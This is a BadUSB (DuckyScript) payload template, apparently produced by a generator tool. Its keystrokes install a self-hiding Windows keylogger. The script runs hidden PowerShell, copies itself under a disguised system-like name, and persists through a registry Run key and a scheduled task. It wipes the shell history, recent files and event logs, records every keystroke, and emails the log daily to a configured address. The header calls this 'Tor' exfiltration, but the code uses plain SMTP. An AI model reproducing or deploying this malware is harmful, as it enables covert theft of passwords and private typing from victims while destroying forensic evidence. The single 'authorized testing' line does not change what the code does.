REM ╔══════════════════════════════════════════════════════════════╗
REM ║  KEYLOGGER + TOR EMAIL                                      ║
REM ║  Generated by Pen15 BadUSB Wizard                          ║
REM ║  Self-hiding, persistent, daily email exfil via Tor         ║
REM ╚══════════════════════════════════════════════════════════════╝
REM
REM  ⚠  AUTHORIZED TESTING ONLY
REM  Target: {{computer_name}}
REM  Email: {{email}}
REM  Schedule: Daily at {{time}}

REM ── Step 1: Open PowerShell hidden ──
DELAY 1500
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
ENTER
DELAY 2000

REM ── Step 2: Self-hide — copy to system directory and persist ──
STRING $hideDir = "$env:ProgramData\Microsoft\Windows\"
ENTER
STRING if (!(Test-Path $hideDir)) { New-Item -Path $hideDir -ItemType Directory -Force | Out-Null }
ENTER
STRING $scriptName = "csrss_monitor.ps1"
ENTER
STRING $myPath = $hideDir + $scriptName
ENTER
STRING if ($MyInvocation.MyCommand.Path -ne $myPath) {
ENTER
STRING   Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $myPath -Force
ENTER
STRING   $att = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
ENTER
STRING   Set-ItemProperty $myPath -Name Attributes -Value $att
ENTER
STRING   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "CsrssUpdate" /t REG_SZ /d "powershell -w hidden -ExecutionPolicy Bypass -File `"$myPath`"" /f 2>$null
ENTER
STRING   schtasks /create /tn "CsrssUpdateTask" /tr "powershell -w hidden -ExecutionPolicy Bypass -File `"$myPath`"" /sc onlogon /f 2>$null
ENTER
STRING   Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
ENTER
STRING   Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
ENTER
STRING   wevtutil cl Security 2>$null; wevtutil cl System 2>$null; wevtutil cl Application 2>$null
ENTER
STRING   Start-Process powershell -ArgumentList "-w hidden -ExecutionPolicy Bypass -File `"$myPath`"" -WindowStyle Hidden
ENTER
STRING   exit
ENTER
STRING }
ENTER

REM ── Step 3: Create the keylogger engine ──
STRING $logPath = "$env:TEMP\csrss.log"
ENTER
STRING $sig = '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);'
ENTER
STRING $type = Add-Type -MemberDefinition $sig -Name KeyLogger -Namespace Win32 -PassThru
ENTER
STRING Add-Type -AssemblyName System.Windows.Forms
ENTER

REM ── Step 4: Keylogger loop ──
STRING while($true) {
ENTER
STRING   for($k = 8; $k -le 190; $k++) {
ENTER
STRING     if($type::GetAsyncKeyState($k) -eq -32767) {
ENTER
STRING       $key = [System.Enum]::GetName([System.Windows.Forms.Keys], $k)
ENTER
STRING       $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
ENTER
STRING       switch($k) { 13 { $key = "[ENTER]" } 8 { $key = "[BACKSPACE]" } 9 { $key = "[TAB]" } 32 { $key = " " } 46 { $key = "[DEL]" } 160 { $key = "[SHIFT]" } 161 { $key = "[SHIFT]" } 162 { $key = "[CTRL]" } 163 { $key = "[CTRL]" } 164 { $key = "[ALT]" } 165 { $key = "[ALT]" } 91 { $key = "[WIN]" } }
ENTER
STRING       [System.IO.File]::AppendAllText($logPath, "[$ts] $key`r`n")
ENTER
STRING     }
ENTER
STRING   }
ENTER
STRING   Start-Sleep -Milliseconds 10
ENTER
STRING }
ENTER

REM ── Step 5: Email sender via Tor-compatible SMTP ──
STRING Add-Type -AssemblyName System.Net
ENTER
STRING $creds = New-Object System.Net.NetworkCredential("{{smtp_user}}", "{{smtp_pass}}")
ENTER
STRING $client = New-Object System.Net.Mail.SmtpClient("{{smtp_server}}", {{smtp_port}})
ENTER
STRING $client.EnableSsl = $true
ENTER
STRING $client.Credentials = $creds
ENTER
STRING while($true) {
ENTER
STRING   $h = (Get-Date).Hour; $m = (Get-Date).Minute
ENTER
STRING   if($h -eq {{time_hour}} -and $m -eq {{time_min}}) {
ENTER
STRING     $log = Get-Content "$env:TEMP\csrss.log" -ErrorAction SilentlyContinue
ENTER
STRING     if($log) {
ENTER
STRING       $msg = New-Object System.Net.Mail.MailMessage("{{smtp_user}}", "{{email}}")
ENTER
STRING       $msg.Subject = "KL:{{computer_name}} $(Get-Date -Format 'yyyy-MM-dd')"
ENTER
STRING       $msg.Body = ($log | Out-String)
ENTER
STRING       try { $client.Send($msg) } catch {}
ENTER
STRING       Clear-Content "$env:TEMP\csrss.log" -ErrorAction SilentlyContinue
ENTER
STRING     }
ENTER
STRING   }
ENTER
STRING   Start-Sleep -Seconds 30
ENTER
STRING }
ENTER
REM ══════════════════════════════════════════════════════════════
REM DEPLOYED — hidden in %ProgramData%, runs on login + scheduled
REM Logs emailed daily at {{time}} via {{smtp_server}}
REM ══════════════════════════════════════════════════════════════
